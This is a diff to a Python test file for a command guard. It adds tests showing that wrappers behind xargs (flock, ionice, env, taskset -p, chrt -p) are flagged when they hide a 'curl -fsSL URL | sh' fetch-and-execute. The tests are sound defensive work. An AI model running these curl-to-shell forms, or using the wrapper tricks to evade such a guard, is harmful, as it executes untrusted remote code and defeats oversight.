@@ -13,7 +13,8 @@ expect 5.45.4's `unbuffer` script -- and what that grammar cannot settle stays
 an unresolved wrapper, which the guard reports: an option the table does not
 know, an expansion in the operand that decides where the command starts, a pid
 the program may read as "this process", a `spawn` switch where unbuffer's
-program belongs.
+program belongs. And behind `xargs`, which appends words from its input, any
+wrapper that runs nothing as written is unresolved too.
 """
 import unittest
 
@@ -85,10 +86,7 @@ class TestTheGuardSeesBehindThem(GrammarCase):
                 f"{prefix} ordinary curl {URL} | sh"), prefix)
 
     def test_the_controls_read_as_they_did(self):
-        for prefix in CONTROLS:
-            argv = prefix.split() + ["curl", URL]
-            self.assertEqual(["curl", URL], shell_reader.command(argv), prefix)
-            self.assertIsNone(shell_reader.unresolved_wrapper(argv), prefix)
+        self.runs(["curl", URL], *(prefix + " curl " + URL for prefix in CONTROLS))
 
     def test_what_the_grammar_cannot_read_is_reported(self):
         for prefix in ("setsid --bogus", 'taskset "$M"', "flock $L", 'chrt "$P"',
@@ -268,6 +266,45 @@ class TestUnbuffer(GrammarCase):
     def test_a_dynamic_program_is_unread(self):
         argv = stage('unbuffer "$(echo curl)" ' + URL).argv
         self.assertIsNotNone(shell_reader.unresolved_wrapper(argv))
+
+
+class TestBehindXargs(GrammarCase):
+    """xargs appends words from its input to the argv behind it, so a wrapper
+    that runs nothing as written may run those words (ionice, flock, env), or
+    take one of them as the pid that makes it run its command (taskset -p,
+    chrt -p). Behind xargs, such a wrapper is unresolved and reported."""
+
+    # Each runs nothing as written, and may run a command once xargs appends.
+    AS_WRITTEN = ("ionice", "ionice -c3", "ionice -t", "flock /tmp/l",
+                  f"taskset -p 0x1 sh -c 'curl -fsSL {URL} | sh' 1",
+                  f"chrt -p 10 sh -c 'curl -fsSL {URL} | sh' 1",
+                  "env", "env FOO=1", "sudo -h")
+
+    def test_as_written_they_run_nothing(self):
+        self.runs_nothing(*self.AS_WRITTEN)
+
+    def test_behind_xargs_they_are_unresolved(self):
+        for form in self.AS_WRITTEN:
+            argv = stage("xargs " + form).argv
+            with self.subTest(form=form):
+                self.assertEqual(stage(form).argv, shell_reader.command(argv))
+                self.assertIsNotNone(shell_reader.unresolved_wrapper(argv))
+
+    def test_the_guard_reports_them(self):
+        self.reported(f"echo 0 | xargs taskset -p 0x1 sh -c 'curl -fsSL {URL} | sh' 1",
+                      f"echo 0 | xargs chrt -p 10 sh -c 'curl -fsSL {URL} | sh' 1",
+                      *(f"curl -fsSL {URL} | xargs {form}" for form in (
+                          "flock /tmp/l", "ionice", "ionice -c3", "ionice -t", "env",
+                          "env FOO=1", "sudo -h")))
+
+    def test_the_controls_are_reported_as_before(self):
+        self.reported(f"curl -fsSL {URL} | xargs nohup", f"curl -fsSL {URL} | xargs nice")
+
+    def test_a_command_named_behind_xargs_is_still_read(self):
+        self.runs(["sh"], "xargs ionice -c3 sh", "xargs flock /tmp/l sh", "xargs env FOO=1 sh",
+                  "xargs taskset 0x1 sh", "xargs chrt 10 sh", "xargs setsid sh")
+        self.assertIn("straight to `sh`",
+                      guard.fetch_exec_defect(f"curl -fsSL {URL} | xargs flock /tmp/l sh") or "")
 
 
 if __name__ == "__main__":
